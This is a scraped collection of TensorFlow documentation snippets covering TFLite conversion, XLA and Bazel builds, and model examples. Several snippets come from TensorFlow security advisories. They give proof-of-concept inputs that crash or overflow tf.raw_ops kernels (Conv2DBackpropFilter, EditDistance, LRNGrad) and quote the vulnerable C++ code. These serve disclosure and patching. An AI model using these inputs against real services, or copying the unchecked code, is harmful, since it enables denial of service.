DESCRIPTION: This tfprof command attributes memory usage back to the lines of code that created the corresponding operations. It displays a call stack-like view, ordered by bytes, filtered by a starting name regex (here `.*seq2seq.*`), and includes entries above a minimum byte threshold. This is useful for identifying code sections responsible for large memory allocations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/profiler/g3doc/profile_memory.md#_snippet_3

LANGUAGE: tfprof
CODE:
```
# code view.
tfprof> code  -max_depth 10 -select bytes -order_by bytes -start_name_regexes .*seq2seq.* -min_bytes 1
```

----------------------------------------

TITLE: Disabling Quantization for MetalDelegate (Swift)
DESCRIPTION: Shows the Swift code required to explicitly disable support for quantized models when initializing the `MetalDelegate` by setting `isQuantizationEnabled` to `false` in the options.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/ios/delegates/gpu.md#_snippet_9

LANGUAGE: Swift
CODE:
```
    var options = MetalDelegate.Options()
    options.isQuantizationEnabled = false
    let delegate = MetalDelegate(options: options)
```

----------------------------------------

TITLE: Loading Vocabulary in AverageWordVecSpec
DESCRIPTION: Loads a vocabulary list from a specified file path. This allows reusing a pre-generated vocabulary instead of generating a new one.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/text_classifier/AverageWordVecSpec.md#_snippet_7

LANGUAGE: python
CODE:
```
load_vocab(
    vocab_filename
)
```

----------------------------------------

TITLE: Converting Quantize-Aware Trained Model (Frozen GraphDef) to TFLite in Python
DESCRIPTION: This snippet shows how to convert a quantize-aware trained TensorFlow model saved as a Frozen GraphDef into an integer-quantized TensorFlow Lite model. It uses `from_frozen_graph` and configures the converter's `quantized_input_stats` and `inference_type` attributes before calling `convert()`. The example assumes input range [-1, 1] for quantization.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/r1/convert/python_api.md#_snippet_5

LANGUAGE: python
CODE:
```
import tensorflow as tf

# Convert the model.
converter = tf.compat.v1.lite.TFLiteConverter.from_frozen_graph(
    graph_def_file='/path/to/mobilenet_v1_1.0_224/frozen_graph.pb',
    input_arrays=['input'],
    input_shapes={'input' : [1, 224, 224,3]},
    output_arrays=['MobilenetV1/Predictions/Softmax'],
)
converter.quantized_input_stats = {'input' : (0., 1.)}  # mean, std_dev (input range is [-1, 1])
converter.inference_type = tf.int8 # this is the recommended type.
# converter.inference_input_type=tf.uint8 # optional
# converter.inference_output_type=tf.uint8 # optional
tflite_model = converter.convert()

# Save the model.
with open('quantized_model.tflite', 'wb') as f:
  f.write(tflite_model)
```

----------------------------------------

TITLE: Download Android SDK Tools in Docker Container
DESCRIPTION: Inside the Docker container, use the Android sdkmanager tool to download specific versions of build tools, platform tools, and Android platforms required for the build. This command ensures all necessary Android SDK components are available.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/lite_build.md#_snippet_4

LANGUAGE: shell
CODE:
```
sdkmanager \
  "build-tools;${ANDROID_BUILD_TOOLS_VERSION}" \
  "platform-tools" \
  "platforms;android-${ANDROID_API_LEVEL}"
```

----------------------------------------

TITLE: Building XLA for GPU/CUDA on Host (Shell)
DESCRIPTION: Configures and builds the XLA project for the CUDA backend directly on the host machine using Bazel. This alternative method uses hermetic rules and may not require a GPU or NVIDIA driver on the host.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/developer_guide.md#_snippet_5

LANGUAGE: sh
CODE:
```
./configure.py --backend=CUDA

bazel build --test_output=all --spawn_strategy=sandboxed //xla/...
```

----------------------------------------

TITLE: Running All Bazel Tests in a Directory - Bash
DESCRIPTION: Executes all Bazel tests located within the specified directory path (`//tensorflow/python/...`). It uses the previously defined `flags` environment variable to apply configurations like CPU/GPU target and failure handling. This command is useful for testing a large set of related components.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/CONTRIBUTING.md#_snippet_10

LANGUAGE: bash
CODE:
```
bazel test ${flags} //tensorflow/python/...
```

----------------------------------------

TITLE: Implementing Custom Accuracy Validator (Java)
DESCRIPTION: Provides an example implementation of the AccuracyValidator interface. The validate method receives the benchmark result (containing the actual model output) and the golden outputs. It should contain the logic to compare the actual output against the expected output and return true if they match according to the defined criteria, or false otherwise.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/acceleration_service.md#_snippet_4

LANGUAGE: Java
CODE:
```
class MyCustomAccuracyValidator implements AccuracyValidator {
   boolean validate(
      BenchmarkResult benchmarkResult,
      ByteBuffer[] goldenOutput) {
        for (int i = 0; i < benchmarkResult.actualOutput().size(); i++) {
            if (!goldenOutputs[i]
               .equals(benchmarkResult.actualOutput().get(i).getValue())) {
               return false;
            }
         }
         return true;

   }
}
```

----------------------------------------

TITLE: Run Classifier Method Python
DESCRIPTION: Creates and trains a classifier model. It takes training and validation datasets, epochs, steps per epoch, and number of classes as input. It returns the trained TensorFlow Keras Model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/text_classifier/BertClassifierSpec.md#_snippet_8

LANGUAGE: python
CODE:
```
run_classifier(
    train_ds, validation_ds, epochs, steps_per_epoch, num_classes, **kwargs
)
```

----------------------------------------

TITLE: Initializing Debugger with Denylisted Operations (Python)
DESCRIPTION: Initializes the Quantization Debugger options to exclude all instances of specific operation types (e.g., 'MEAN') from quantization across the entire model. This provides a way to globally prevent certain ops from being quantized.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/quantization_debugger.ipynb#_snippet_18

LANGUAGE: python
CODE:
```
debug_options = tf.lite.experimental.QuantizationDebugOptions(
    denylisted_ops=['MEAN'])
debugger = tf.lite.experimental.QuantizationDebugger(
    converter=converter,
    debug_dataset=representative_dataset(ds),
    debug_options=debug_options)
```

----------------------------------------

TITLE: Checking TFLite GPU Delegate Compatibility Python
DESCRIPTION: Shows how to specifically check for compatibility with the TensorFlow Lite GPU delegate using the `experimental_supported_backends` option in `tf.lite.TargetSpec`. This allows validating the model against operations supported by the GPU delegate. The example uses a function with operations that may have known GPU compatibility issues to demonstrate the check's utility.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/authoring.ipynb#_snippet_8

LANGUAGE: python
CODE:
```
target_spec = tf.lite.TargetSpec()
target_spec.supported_ops = [
 tf.lite.OpsSet.TFLITE_BUILTINS,
 tf.lite.OpsSet.SELECT_TF_OPS,
]
target_spec.experimental_supported_backends = ["GPU"]
@tf.lite.experimental.authoring.compatible(converter_target_spec=target_spec)
@tf.function(input_signature=[
 tf.TensorSpec(shape=[4, 4], dtype=tf.float32)
])
def func(x):
 y = tf.cosh(x)
 return y + tf.slice(x, [1, 1], [1, 1])

result = func(tf.ones(shape=(4,4), dtype=tf.float32))
```

----------------------------------------

TITLE: Iterating tf.Tensor with AutoGraph for loop Python
DESCRIPTION: Demonstrates how AutoGraph converts a Python `for` loop iterating directly over a `tf.Tensor` into a TensorFlow `tf.while_loop` operating on the first dimension. The output shows the result of printing each element.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/control_flow.md#_snippet_20

LANGUAGE: Python
CODE:
```
for i in tf.constant(((1, 2), (3, 4))):
  tf.print('iteration:', i)
```

----------------------------------------

TITLE: Registering SimpleHashTableInsert Op - TensorFlow C++
DESCRIPTION: Registers a TensorFlow custom operation named "Examples>SimpleHashTableInsert". This op takes a resource handle, a key, and a value as input and inserts or updates the key-value pair in the associated hash table resource. It requires `key_dtype` and `value_dtype` attributes for type validation and inference. `SetShapeFn(ThreeScalarInputs)` indicates the expected input shapes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/simple_hash_table/README.md#_snippet_5

LANGUAGE: C++
CODE:
```
REGISTER_OP("Examples>SimpleHashTableInsert")
    .Input("resource_handle: resource")
    .Input("key: key_dtype")
    .Input("value: value_dtype")
    .Attr("key_dtype: type")
    .Attr("value_dtype: type")
    .SetShapeFn(ThreeScalarInputs);
```

----------------------------------------

TITLE: Defining Pose Classification Model - Python
DESCRIPTION: Constructs a Keras Sequential model for pose classification. The model takes flattened landmark coordinates as input, applies a custom embedding function for normalization and flattening, followed by dense layers with ReLU activation, dropout for regularization, and a final dense layer with softmax activation to predict class probabilities based on the number of detected classes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/tutorials/pose_classification.ipynb#_snippet_16

LANGUAGE: python
CODE:
```
# Define the model
inputs = tf.keras.Input(shape=(51))
embedding = landmarks_to_embedding(inputs)

layer = keras.layers.Dense(128, activation=tf.nn.relu6)(embedding)
layer = keras.layers.Dropout(0.5)(layer)
layer = keras.layers.Dense(64, activation=tf.nn.relu6)(layer)
layer = keras.layers.Dropout(0.5)(layer)
outputs = keras.layers.Dense(len(class_names), activation="softmax")(layer)

model = keras.Model(inputs, outputs)
model.summary()
```

----------------------------------------

TITLE: Check NVIDIA GPU Status (Shell)
DESCRIPTION: Runs the `nvidia-smi` command to display information about the NVIDIA GPUs present in the system, including driver version, GPU usage, and processes using the GPU. This is used to verify GPU availability and status in GPU-enabled CI jobs.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/build_tools/ci/golden_commands.txt#_snippet_3

LANGUAGE: shell
CODE:
```
nvidia-smi
```

----------------------------------------

TITLE: Defining TFLite Model Evaluation Function Python
DESCRIPTION: Defines a Python function evaluate_model that takes a TFLite interpreter as input. It iterates through the entire test dataset, performs inference on each image, collects the predicted digits, and calculates the overall accuracy by comparing predictions against ground truth labels.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_quant.ipynb#_snippet_12

LANGUAGE: python
CODE:
```
# A helper function to evaluate the TF Lite model using "test" dataset.
def evaluate_model(interpreter):
  input_index = interpreter.get_input_details()[0]["index"]
  output_index = interpreter.get_output_details()[0]["index"]

  # Run predictions on every image in the "test" dataset.
  prediction_digits = []
  for test_image in test_images:
    # Pre-processing: add batch dimension and convert to float32 to match with
    # the model's input data format.
    test_image = np.expand_dims(test_image, axis=0).astype(np.float32)
    interpreter.set_tensor(input_index, test_image)

    # Run inference.
    interpreter.invoke()

    # Post-processing: remove batch dimension and find the digit with the highest
    # probability.
    output = interpreter.tensor(output_index)
    digit = np.argmax(output()[0])
    prediction_digits.append(digit)

  # Compare prediction results with ground truth labels to calculate accuracy.
  accurate_count = 0
  for index in range(len(prediction_digits)):
    if prediction_digits[index] == test_labels[index]:
      accurate_count += 1
  accuracy = accurate_count * 1.0 / len(prediction_digits)

  return accuracy
```

----------------------------------------

TITLE: Load, Preprocess, Train, and Evaluate MNIST Model
DESCRIPTION: Loads the MNIST dataset, preprocesses the image data by scaling pixel values to [0, 1] and converting to float32. It includes an option for fast training with a smaller subset and fewer epochs. The model is then trained using the `fit` method and evaluated using the `evaluate` method.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/experimental_new_converter/keras_lstm.ipynb#_snippet_3

LANGUAGE: python
CODE:
```
# Load MNIST dataset.
(x_train, y_train), (x_test, y_test) = tf.keras.datasets.mnist.load_data()
x_train, x_test = x_train / 255.0, x_test / 255.0
x_train = x_train.astype(np.float32)
x_test = x_test.astype(np.float32)

# Change this to True if you want to test the flow rapidly.
# Train with a small dataset and only 1 epoch. The model will work poorly
# but this provides a fast way to test if the conversion works end to end.
_FAST_TRAINING = False
_EPOCHS = 5
if _FAST_TRAINING:
  _EPOCHS = 1
  _TRAINING_DATA_COUNT = 1000
  x_train = x_train[:_TRAINING_DATA_COUNT]
  y_train = y_train[:_TRAINING_DATA_COUNT]

model.fit(x_train, y_train, epochs=_EPOCHS)
model.evaluate(x_test, y_test, verbose=0)
```

----------------------------------------

TITLE: Example HLO Output from JAX Function
DESCRIPTION: Shows the generated HLO text for the `f` function with 1024x512 and 512x2048 inputs. It details the HLO operations performed: parameter loading, conversion, dot product, constant broadcasting, multiplication, and negation, resulting in a bf16[1024,2048] output.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/gpu_architecture.md#_snippet_2

LANGUAGE: HLO
CODE:
```
HloModule xla_computation_f, entry_computation_layout={(s8[1024,512]{1,0}, bf16[512,2048]{1,0})->(bf16[1024,2048]{1,0})}

ENTRY main.10 {
  Arg_0.1 = s8[1024,512]{1,0} parameter(0)
  convert.5 = bf16[1024,512]{1,0} convert(Arg_0.1)
  Arg_1.2 = bf16[512,2048]{1,0} parameter(1)
  dot.6 = bf16[1024,2048]{1,0} dot(convert.5, Arg_1.2), lhs_contracting_dims={1}, rhs_contracting_dims={0}
  constant.3 = bf16[] constant(0.125)
  broadcast.4 = bf16[1024,2048]{1,0} broadcast(constant.3), dimensions={}
  multiply.7 = bf16[1024,2048]{1,0} multiply(dot.6, broadcast.4)
  ROOT negate.8 = bf16[1024,2048]{1,0} negate(multiply.7)
}
```

----------------------------------------

TITLE: Build and Run Sample App with Delegate - Android Bash
DESCRIPTION: Builds and immediately runs a sample Android application that demonstrates the usage of the stable delegate, using Bazel. It provides a test TensorFlow Lite model (`add.tflite`) as an argument to the app to execute inference using the sample stable delegate.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/utils/experimental/sample_stable_delegate/README.md#_snippet_14

LANGUAGE: bash
CODE:
```
bazel run -c opt \
    //tensorflow/lite/delegates/utils/experimental/sample_stable_delegate:sample_app_using_stable_delegate \
    tensorflow/lite/testdata/add.tflite
```

----------------------------------------

TITLE: Running TensorFlow C++ Detector on Custom Image bash
DESCRIPTION: This command runs the `detect_objects` binary on a user-provided image file specified by the `--image` argument. The executable will process the image using the loaded model and print detection results (like bounding boxes and scores) to the console.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/multibox_detector/README.md#_snippet_3

LANGUAGE: bash
CODE:
```
bazel-bin/tensorflow/examples/multibox_detector/detect_objects --image=my_image.png
```

----------------------------------------

TITLE: Calculating Shard Size with Vulnerable Division in TensorFlow C++ Kernel
DESCRIPTION: This C++ snippet shows the calculation within the TensorFlow `Conv2DBackpropFilter` kernel where the division-by-zero vulnerability originates. It demonstrates how the `work_unit_size`, computed from input tensor dimensions, is used as a divisor for `shard_size` calculation without checking if it is non-zero, leading to a runtime crash when inputs are zero-sized. This code highlights the specific logic error causing the security issue.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-027.md#_snippet_1

LANGUAGE: cpp
CODE:
```
const size_t size_A = output_image_size * filter_total_size;\nconst size_t size_B = output_image_size * dims.out_depth;\nconst size_t size_C = filter_total_size * dims.out_depth;\nconst size_t work_unit_size = size_A + size_B + size_C;\nconst size_t shard_size = (target_working_set_size + work_unit_size - 1) / work_unit_size;
```

----------------------------------------

TITLE: Blending Style Bottlenecks (Python)
DESCRIPTION: Performs linear blending between the style bottleneck vector obtained from the original style image and the style bottleneck vector obtained from the content image. The `content_blending_ratio` (a value between 0.0 and 1.0) determines the weight given to the content's style. A new blended style bottleneck vector is created, which can then be used with the style transform model to produce a blended output. Requires the style bottlenecks from both images and the blending ratio.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/style_transfer/overview.ipynb#_snippet_8

LANGUAGE: python
CODE:
```
# Define content blending ratio between [0..1].
# 0.0: 0% style extracts from content image.
# 1.0: 100% style extracted from content image.
content_blending_ratio = 0.5 #@param {type:"slider", min:0, max:1, step:0.01}

# Blend the style bottleneck of style image and content image
style_bottleneck_blended = content_blending_ratio * style_bottleneck_content \
                           + (1 - content_blending_ratio) * style_bottleneck
```

----------------------------------------

TITLE: Building XLA for CPU Backend Natively (Linux)
DESCRIPTION: Runs the Bazel build command natively on the host system to compile the entire XLA project (`//xla/...`) targeting the CPU backend. Options include showing all test output and using a sandboxed spawn strategy.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/build_from_source.md#_snippet_5

LANGUAGE: shell
CODE:
```
bazel build --test_output=all --spawn_strategy=sandboxed //xla/...
```

----------------------------------------

TITLE: Inspecting Generated Source File for Regular Function - TensorFlow AutoGraph - Python
DESCRIPTION: This snippet demonstrates how to obtain the source file path of the code generated by TensorFlow AutoGraph for a standard Python function using `tf.autograph.to_graph` and Python's `inspect.getsourcefile`. It requires the `tensorflow` and `inspect` libraries. The output is the path to a temporary file containing the converted code.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/generated_code.md#_snippet_0

LANGUAGE: Python
CODE:
```
def f(a):
  ...

converted_f = tf.autograph.to_graph(f)
print(inspect.getsourcefile(converted_f))
```

----------------------------------------

TITLE: Installing TensorFlow C Library Package using Tar (Shell)
DESCRIPTION: This command uses the standard `tar` utility to extract the previously built `libtensorflow.tar.gz` archive into a specified target directory, typically `/usr/local`, making the C library available system-wide.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/lib_package/README.md#_snippet_1

LANGUAGE: Shell
CODE:
```
tar -C /usr/local -xzf libtensorflow.tar.gz
```

----------------------------------------

TITLE: Accessing Content Properties Python
DESCRIPTION: Retrieves the properties associated with the Content object. This method is likely used to access specific metadata fields defined within the Content schema.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/Content.md#_snippet_1

LANGUAGE: python
CODE:
```
ContentProperties()
```

----------------------------------------

TITLE: Dump Autotune Results using XLA_FLAGS
DESCRIPTION: This command demonstrates using the `XLA_FLAGS` environment variable to dump autotuning results generated during an XLA program run to a specified file.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tools.md#_snippet_11

LANGUAGE: Bash
CODE:
```
XLA_FLAGS=--xla_gpu_dump_autotune_results_to=<myfile.pbtxt>
```

----------------------------------------

TITLE: Adding MLIR Buffer Transforms Library Target - CMake
DESCRIPTION: Defines a CMake target for building the `MLIRBufferTransforms` library. It compiles the listed C++ source files, depends on other generated sources or libraries (`LMHLOTransformsPassIncGen`, `MLIRDeallocationPassesIncGen`), links against necessary MLIR and dialect libraries, and requires the Core component.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/transforms/CMakeLists.txt#_snippet_6

LANGUAGE: CMake
CODE:
```
add_mlir_library(MLIRBufferTransforms
  alloc_to_arg_pass.cc
  bufferize.cc
  bufferize_pass.cc
  collapse_parallel_loops_to_1d_pass.cc
  detensorize_scf_ops.cc
  generic_host_to_llvm.cc
  lower_index_cast_pass.cc
  naive_copy_removal.cc
  tile_loops_pass.cc
  vectorize_copy.cc
  unbufferize_pass.cc

  DEPENDS
  LMHLOTransformsPassIncGen
  MLIRDeallocationPassesIncGen

  LINK_COMPONENTS
  Core

  LINK_LIBS PUBLIC
  ChloOps
  MLIRGPUDialect
  MLIRIR
  MLIRMathTransforms
  MLIRPass
  MLIRReconcileUnrealizedCasts
  MLIRShapeDialect
  MLIRTransformDialectTransforms
  MLIRTransforms
  MLIRX86VectorDialect
  MLIRX86VectorTransforms
  MhloDialect
)
```

----------------------------------------

TITLE: Triggering Heap Overflow in TensorFlow Conv2DBackpropFilter with Specific Inputs
DESCRIPTION: This Python snippet demonstrates how to trigger a heap buffer overflow vulnerability in TensorFlow's `tf.raw_ops.Conv2DBackpropFilter` operation. It uses specific float values in the input tensor and particular stride parameters, which, combined with insufficient validation in the operation's implementation, lead to the overflow. Requires the `tensorflow` library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-028.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

input_tensor = tf.constant([386.078431372549, 386.07843139643234],
                           shape=[1, 1, 1, 2], dtype=tf.float32)
filter_sizes = tf.constant([1, 1, 1, 1], shape=[4], dtype=tf.int32)
out_backprop = tf.constant([386.078431372549], shape=[1, 1, 1, 1],
                           dtype=tf.float32)

tf.raw_ops.Conv2DBackpropFilter(
  input=input_tensor,
  filter_sizes=filter_sizes,
  out_backprop=out_backprop,
  strides=[1, 66, 49, 1],
  use_cudnn_on_gpu=True,
  padding='VALID',
  explicit_paddings=[],
  data_format='NHWC',
  dilations=[1, 1, 1, 1]
)
```

----------------------------------------

TITLE: Vulnerable Modulo Operation in QuantizedAdd (C++)
DESCRIPTION: This C++ snippet shows the `VectorTensorAddition` helper function within the `QuantizedAdd` implementation. The vulnerability occurs in the line `const int64 vector_i = i % vector_num_elements;` because the code does not validate if `vector_num_elements` is zero before performing the modulo operation. This value is derived from input tensor shapes, which can be manipulated by a user to be zero, leading to a crash.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-037.md#_snippet_1

LANGUAGE: cpp
CODE:
```
void VectorTensorAddition(const T* vector_data, float min_vector,
                          float max_vector, int64 vector_num_elements,
                          const T* tensor_data, float min_tensor,
                          float max_tensor, int64 tensor_num_elements,
                          float output_min, float output_max, Toutput* output) {
  for (int i = 0; i < tensor_num_elements; ++i) {
    const int64 vector_i = i % vector_num_elements;
    ...
  }
}
```

----------------------------------------

TITLE: Triggering Division By Zero in TensorFlow Conv2DBackpropFilter (Python)
DESCRIPTION: This Python snippet provides a minimal example to reproduce the division-by-zero vulnerability in TensorFlow's `Conv2DBackpropFilter` operation. It demonstrates how providing zero-sized tensors for the input, filter sizes, and output backprop arguments leads to a runtime error. This serves as a proof-of-concept for the denial of service vulnerability.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-027.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf\n\ninput_tensor = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)\nfilter_sizes = tf.constant([0, 0, 0, 0], shape=[4], dtype=tf.int32)\nout_backprop = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)\n\ntf.raw_ops.Conv2DBackpropFilter(\n  input=input_tensor,\n  filter_sizes=filter_sizes,\n  out_backprop=out_backprop,\n  strides=[1, 1, 1, 1],\n  use_cudnn_on_gpu=False,\n  padding='SAME',\n  explicit_paddings=[],\n  data_format='NHWC',\n  dilations=[1, 1, 1, 1]\n)
```

----------------------------------------

TITLE: Full Example: Creating, Saving, and Converting Keras Model to TFLite in Python
DESCRIPTION: This comprehensive example demonstrates the full process of creating a simple Keras Sequential model, compiling and training it minimally, saving it to an H5 file, and then converting that H5 file into a TensorFlow Lite model. It requires NumPy and TensorFlow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/r1/convert/python_api.md#_snippet_2

LANGUAGE: python
CODE:
```
import numpy as np
import tensorflow as tf

# Generate tf.keras model.
model = tf.keras.models.Sequential()
model.add(tf.keras.layers.Dense(2, input_shape=(3,)))
model.add(tf.keras.layers.RepeatVector(3))
model.add(tf.keras.layers.TimeDistributed(tf.keras.layers.Dense(3)))
model.compile(loss=tf.keras.losses.MSE,
              optimizer=tf.keras.optimizers.RMSprop(lr=0.0001),
              metrics=[tf.keras.metrics.categorical_accuracy],
              sample_weight_mode='temporal')

x = np.random.random((1, 3))
y = np.random.random((1, 3, 3))
model.train_on_batch(x, y)
model.predict(x)

# Save tf.keras model in H5 format.
keras_file = 'keras_model.h5'
tf.keras.models.save_model(model, keras_file)

# Convert the model.
converter = tf.compat.v1.lite.TFLiteConverter.from_keras_model_file(keras_file)
tflite_model = converter.convert()

# Save the model.
with open('model.tflite', 'wb') as f:
  f.write(tflite_model)
```

----------------------------------------

TITLE: Registering Custom Operator (C++ Example)
DESCRIPTION: Provides a C++ example function (`MyCustomOpRegistrationExternal`) that encapsulates the process of creating and configuring the `TfLiteOperator`. It creates the operator using `TfLiteOperatorCreate` and then uses the `TfLiteOperatorSet*` functions to register the addresses of the C++ implementation methods (defined in an anonymous namespace).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ops_custom.md#_snippet_11

LANGUAGE: C++
CODE:
```
namespace my_namespace::my_custom_op {
  namespace {
    void* Init(TfLiteOpaqueContext* context,
               const char* buffer, size_t length) { ... }
    void Free(TfLiteOpaqueContext* context, void* buffer) { ... }
    TfLiteStatus Prepare(TfLiteOpaqueContext* context,
                         TfLiteOpaqueNode* node) { ... }
    TfLiteStatus Invoke(TfLiteOpaqueContext* context,
                        TfLiteOpaqueNode* node) {... }
  };

  const TfLiteOperator* MyCustomOpRegistrationExternal() {
    // Singleton instance, intentionally never destroyed.
    static const TfLiteOperator* my_custom_op = ()[] {
        TfLiteOperator* r =
            TfLiteOperatorCreate(
                kTfLiteBuiltinCustom, "MyCustomOp", /*version=*/ 1);
        TfLiteOperatorSetInit(r, Init);
        TfLiteOperatorSetFree(r, Free);
        TfLiteOperatorSetPrepare(r, Prepare);
        TfLiteOperatorSetInvoke(r, Eval);
        return r;
      };
    return my_custom_op;
  }
}  // namespace my_namespace
```

----------------------------------------

TITLE: Starting TFLite Accuracy Benchmark (ADB Shell)
DESCRIPTION: This ADB shell command launches the Android activity responsible for executing the TFLite delegate accuracy benchmark. It uses `am start` to specify the target activity and passes the paths to the TFLite settings file(s) via the `--tflite_settings_files` extra argument. The settings files define the test and reference delegates.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/benchmark/experimental/delegate_performance/android/README.md#_snippet_13

LANGUAGE: ADB Shell
CODE:
```
adb shell "am start -S \
-n org.tensorflow.lite.benchmark.delegateperformance/org.tensorflow.lite.benchmark.delegateperformance.BenchmarkAccuracyActivity \
--esa --tflite_settings_files '/data/local/tmp/stable_delegate_settings.json'"
```

----------------------------------------

TITLE: Extracting Subgraph from GraphDef by Specifying Inputs and Outputs
DESCRIPTION: This command demonstrates how to extract a specific subgraph from a large Frozen GraphDef by defining the desired input and output tensor names for the subgraph. The converter will only include the operations necessary to compute the specified outputs from the specified inputs.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/r1/convert/cmdline_examples.md#_snippet_10

LANGUAGE: Shell
CODE:
```
tflite_convert \
  --graph_def_file=/tmp/inception_v1_2016_08_28_frozen.pb \
  --output_file=/tmp/foo.pb \
  --input_arrays=InceptionV1/InceptionV1/Mixed_3b/Branch_1/Conv2d_0a_1x1/Relu,InceptionV1/InceptionV1/Mixed_3b/Branch_2/Conv2d_0a_1x1/Relu,InceptionV1/InceptionV1/Mixed_3b/Branch_3/MaxPool_0a_3x3/MaxPool,InceptionV1/InceptionV1/Mixed_3b/Branch_0/Conv2d_0a_1x1/Relu \
  --input_shapes=1,28,28,96:1,28,28,16:1,28,28,192:1,28,28,64 \
  --output_arrays=InceptionV1/InceptionV1/Mixed_3b/concat_v2
```

----------------------------------------

TITLE: Validating TFLite Acceleration Config with Play Services (Java)
DESCRIPTION: This code snippet shows how to use the `AccelerationService` to validate a specific `AccelerationConfig` for a given `Model` and `ValidationConfig`. It creates the service, calls `validateConfig`, and uses an `addOnSuccessListener` callback to process the asynchronous result (`ValidatedAccelerationConfigResult`). If the result is valid and passes the accuracy test, the validated configuration is set on `InterpreterOptions` to create a TensorFlow Lite `InterpreterApi` instance.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/acceleration_service.md#_snippet_7

LANGUAGE: Java
CODE:
```
InterpreterApi interpreter;
InterpreterOptions interpreterOptions = InterpreterApi.Options();
AccelerationService.create(context)
   .validateConfig(model, accelerationConfig, validationConfig)
   .addOnSuccessListener(validatedConfig -> {
      if (validatedConfig.isValid() && validatedConfig.benchmarkResult().hasPassedAccuracyTest()) {
         interpreterOptions.setAccelerationConfig(validatedConfig);
         interpreter = InterpreterApi.create(model, interpreterOptions);
});
```

----------------------------------------

TITLE: Demonstrating TensorFlow EditDistance Negative Input Segfault - Python
DESCRIPTION: This Python snippet demonstrates how passing negative values in the input tensors (`hypothesis_indices`, `truth_indices`) to `tf.raw_ops.EditDistance` can exploit a vulnerability. This can lead to a segmentation fault, causing a denial of service. The inputs are crafted with specific negative values to trigger the flawed index calculation within the operation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-077.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf

hypothesis_indices = tf.constant(-1250999896764, shape=[3, 3], dtype=tf.int64)
hypothesis_values = tf.constant(0, shape=[3], dtype=tf.int64)
hypothesis_shape = tf.constant(0, shape=[3], dtype=tf.int64)

truth_indices = tf.constant(-1250999896764, shape=[3, 3], dtype=tf.int64)
truth_values = tf.constant(2, shape=[3], dtype=tf.int64)
truth_shape = tf.constant(2, shape=[3], dtype=tf.int64)

tf.raw_ops.EditDistance(
  hypothesis_indices=hypothesis_indices,
  hypothesis_values=hypothesis_values,
  hypothesis_shape=hypothesis_shape,
  truth_indices=truth_indices,
  truth_values=truth_values,
  truth_shape=truth_shape)
```

----------------------------------------

TITLE: Demonstrating TensorFlow LRNGrad Vulnerability - Python
DESCRIPTION: This Python snippet demonstrates the denial of service vulnerability in `tf.raw_ops.LRNGrad` by providing an `output_image` tensor with an invalid rank (6D) instead of the expected 4D, which triggers a `CHECK` fail in vulnerable TensorFlow versions. It initializes input tensors and parameters with arbitrary values.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-116.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
depth_radius = 1
bias = 1.59018219
alpha = 0.117728651
beta = 0.404427052
input_grads = tf.random.uniform(shape=[4, 4, 4, 4], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2033)
